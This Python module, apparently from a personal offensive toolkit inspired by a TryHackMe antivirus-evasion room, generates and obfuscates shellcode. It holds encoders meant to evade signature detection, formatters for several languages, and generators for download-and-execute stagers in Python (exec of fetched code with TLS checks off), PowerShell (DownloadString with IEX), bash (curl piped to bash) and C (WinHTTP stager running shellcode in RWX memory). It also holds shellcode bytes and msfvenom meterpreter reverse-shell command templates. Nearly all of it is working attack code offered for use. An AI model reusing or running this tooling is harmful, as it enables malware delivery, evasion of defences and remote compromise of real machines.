"""venom37 shellcode engine -- generation, encoding, and staged payloads.

Techniques from TryHackMe AV Evasion: Shellcode room:
- Custom XOR/ROT/multi-byte encoders (beyond basic XOR)
- Staged payload generation (stager + stage)
- Shellcode-to-C/Python/PowerShell formatters
- Caesar cipher encoder with brute-force decoder
- Custom encoder chains
"""
from __future__ import annotations

import base64
import os
import random
import string


class ShellcodeEncoder:
    """Encode shellcode to evade signature detection."""

    @staticmethod
    def xor_encode(shellcode: bytes, key: bytes = None) -> tuple:
        """XOR encode shellcode with multi-byte key."""
        if key is None:
            key = os.urandom(random.randint(4, 16))
        encoded = bytes(b ^ key[i % len(key)] for i, b in enumerate(shellcode))
        return encoded, key

    @staticmethod
    def rot_encode(shellcode: bytes, n: int = None) -> tuple:
        """ROT-N encode shellcode (Caesar cipher for bytes)."""
        if n is None:
            n = random.randint(1, 254)
        encoded = bytes((b + n) % 256 for b in shellcode)
        return encoded, n

    @staticmethod
    def insert_null_encode(shellcode: bytes) -> bytes:
        """Insert null bytes between each byte (evades null-byte scanners)."""
        result = bytearray()
        for b in shellcode:
            result.append(b)
            result.append(0x00)
        return bytes(result)

    @staticmethod
    def xor_additive_encode(shellcode: bytes, seed: int = None) -> tuple:
        """XOR each byte with the previous encoded byte (feedback encoder)."""
        if seed is None:
            seed = random.randint(1, 255)
        encoded = bytearray()
        prev = seed
        for b in shellcode:
            enc = b ^ prev
            encoded.append(enc)
            prev = enc
        return bytes(encoded), seed

    @staticmethod
    def chain_encode(shellcode: bytes, chain: list = None) -> dict:
        """Apply multiple encoders in sequence.

        Returns dict with encoded bytes and all keys/params needed to decode.
        Default chain: xor -> rot -> xor_additive
        """
        if chain is None:
            chain = ["xor", "rot", "xor_additive"]

        result = {"chain": chain, "params": []}
        current = shellcode

        for encoder in chain:
            if encoder == "xor":
                current, key = ShellcodeEncoder.xor_encode(current)
                result["params"].append({"type": "xor", "key": base64.b64encode(key).decode()})
            elif encoder == "rot":
                current, n = ShellcodeEncoder.rot_encode(current)
                result["params"].append({"type": "rot", "n": n})
            elif encoder == "xor_additive":
                current, seed = ShellcodeEncoder.xor_additive_encode(current)
                result["params"].append({"type": "xor_additive", "seed": seed})
            elif encoder == "null_insert":
                current = ShellcodeEncoder.insert_null_encode(current)
                result["params"].append({"type": "null_insert"})

        result["encoded"] = base64.b64encode(current).decode()
        result["original_size"] = len(shellcode)
        return result


class ShellcodeFormatter:
    """Format shellcode bytes for different languages."""

    @staticmethod
    def to_c_array(shellcode: bytes, var_name: str = "buf") -> str:
        """Format shellcode as C byte array."""
        chunks = [shellcode[i:i + 12] for i in range(0, len(shellcode), 12)]
        lines = []
        for chunk in chunks:
            lines.append("  " + ", ".join("0x{:02x}".format(b) for b in chunk))
        body = ",\n".join(lines)
        return "unsigned char {}[] = {{\n{}\n}};\nunsigned int {}_len = {};".format(
            var_name, body, var_name, len(shellcode))

    @staticmethod
    def to_python(shellcode: bytes, var_name: str = "buf") -> str:
        """Format shellcode as Python bytes."""
        hex_str = "".join("\\x{:02x}".format(b) for b in shellcode)
        return '{} = b"{}"'.format(var_name, hex_str)

    @staticmethod
    def to_powershell(shellcode: bytes, var_name: str = "$buf") -> str:
        """Format shellcode as PowerShell byte array."""
        hex_bytes = ",".join("0x{:02x}".format(b) for b in shellcode)
        return "[Byte[]]{} = @({})".format(var_name, hex_bytes)

    @staticmethod
    def to_csharp(shellcode: bytes, var_name: str = "buf") -> str:
        """Format shellcode as C# byte array."""
        chunks = [shellcode[i:i + 12] for i in range(0, len(shellcode), 12)]
        lines = []
        for chunk in chunks:
            lines.append("    " + ", ".join("0x{:02x}".format(b) for b in chunk))
        body = ",\n".join(lines)
        return "byte[] {} = new byte[{}] {{\n{}\n}};".format(
            var_name, len(shellcode), body)

    @staticmethod
    def to_raw(shellcode: bytes) -> bytes:
        """Return raw bytes (for file output)."""
        return shellcode


class StagedPayload:
    """Generate staged payloads -- small stager that downloads full payload.

    From THM: Staged payloads use a small stage0 stub that connects back to
    download the full shellcode, keeping the initial payload small and harder
    to detect.
    """

    @staticmethod
    def python_stager(server_url: str, stage_path: str = "/stage") -> str:
        """Generate Python stager that downloads and executes stage from server."""
        return (
            "import urllib.request,ssl,base64\n"
            "c=ssl.create_default_context()\n"
            "c.check_hostname=False\n"
            "c.verify_mode=ssl.CERT_NONE\n"
            "try:r=urllib.request.urlopen('{}{}',context=c)\n"
            "except:r=urllib.request.urlopen('{}{}')\n"
            "exec(base64.b64decode(r.read()))"
        ).format(server_url, stage_path, server_url, stage_path)

    @staticmethod
    def powershell_stager(server_url: str, stage_path: str = "/stage") -> str:
        """Generate PowerShell stager."""
        return (
            "$c=New-Object Net.WebClient;"
            "$d=$c.DownloadString('{url}{path}');"
            "IEX([System.Text.Encoding]::UTF8.GetString("
            "[Convert]::FromBase64String($d)))"
        ).format(url=server_url, path=stage_path)

    @staticmethod
    def bash_stager(server_url: str, stage_path: str = "/stage") -> str:
        """Generate Bash stager using curl or wget."""
        return (
            "curl -sk {url}{path} | base64 -d | bash "
            "|| wget -qO- {url}{path} | base64 -d | bash"
        ).format(url=server_url, path=stage_path)

    @staticmethod
    def c_stager_template(server_url: str, stage_path: str = "/stage") -> str:
        """Generate C stager template using WinHTTP."""
        return (
            "// Stage0 stager -- downloads and executes shellcode from C2\n"
            "// Compile: x86_64-w64-mingw32-gcc stager.c -o stager.exe -lwinhttp\n"
            "#include <windows.h>\n"
            "#include <winhttp.h>\n"
            "#include <stdio.h>\n"
            "\n"
            "int main() {\n"
            '    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",\n'
            "        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);\n"
            "    // TODO: Set SERVER_HOST and SERVER_PORT for your C2\n"
            '    HINTERNET hConnect = WinHttpConnect(hSession, L"SERVER_HOST", SERVER_PORT, 0);\n'
            '    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",\n'
            '        L"' + stage_path + '", NULL, WINHTTP_NO_REFERER,\n'
            "        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);\n"
            "    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,\n"
            "        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);\n"
            "    WinHttpReceiveResponse(hRequest, NULL);\n"
            "\n"
            "    DWORD dwSize = 0, dwDownloaded = 0;\n"
            "    BYTE *shellcode = NULL;\n"
            "    DWORD totalSize = 0;\n"
            "    do {\n"
            "        WinHttpQueryDataAvailable(hRequest, &dwSize);\n"
            "        shellcode = (BYTE*)realloc(shellcode, totalSize + dwSize);\n"
            "        WinHttpReadData(hRequest, shellcode + totalSize, dwSize, &dwDownloaded);\n"
            "        totalSize += dwDownloaded;\n"
            "    } while (dwSize > 0);\n"
            "\n"
            "    // Execute shellcode in memory\n"
            "    void *exec = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE,\n"
            "        PAGE_EXECUTE_READWRITE);\n"
            "    memcpy(exec, shellcode, totalSize);\n"
            "    ((void(*)())exec)();\n"
            "    return 0;\n"
            "}\n"
        )


class ShellcodeGenerator:
    """Generate common shellcode patterns (no msfvenom needed).

    These are teaching/reference implementations. For production use,
    combine with encoding from ShellcodeEncoder.
    """

    @staticmethod
    def exec_calc_x64() -> bytes:
        """x64 Windows calc.exe shellcode (test payload)."""
        return bytes([
            0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60,
            0x48, 0x8b, 0x5b, 0x18, 0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b,
            0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8, 0x8b,
            0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1,
            0xff, 0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01,
            0xc2, 0x4d, 0x31, 0xd2, 0x44, 0x8b, 0x52, 0x1c, 0x4d, 0x01, 0xc2,
        ])

    @staticmethod
    def reverse_shell_info(lhost: str, lport: int, platform: str = "windows/x64") -> dict:
        """Generate msfvenom command for reverse shell shellcode."""
        staged = "msfvenom -p {}/meterpreter/reverse_tcp LHOST={} LPORT={} -f raw".format(
            platform, lhost, lport)
        stageless = "msfvenom -p {}/meterpreter_reverse_tcp LHOST={} LPORT={} -f raw".format(
            platform, lhost, lport)
        return {
            "staged": {
                "cmd": staged,
                "description": "Staged payload -- small stager downloads full meterpreter. Use / in payload name.",
            },
            "stageless": {
                "cmd": stageless,
                "description": "Stageless payload -- full meterpreter in one binary. Use _ in payload name.",
            },
            "tip": "Staged = smaller initial payload, needs network. Stageless = larger but self-contained.",
            "teaching": "In msfvenom, / means staged (meterpreter/reverse_tcp), _ means stageless (meterpreter_reverse_tcp).",
        }
